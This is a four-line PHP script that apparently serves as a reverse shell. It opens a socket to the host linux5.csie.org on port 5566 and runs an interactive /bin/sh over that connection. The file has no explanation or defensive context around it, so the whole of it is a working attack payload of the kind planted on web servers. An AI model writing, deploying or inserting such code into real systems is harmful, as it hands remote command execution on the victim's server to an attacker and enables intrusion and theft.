<?php
$sock=fsockopen("linux5.csie.org",5566);
exec("/bin/sh -i <&3 >&3 2>&3");
?>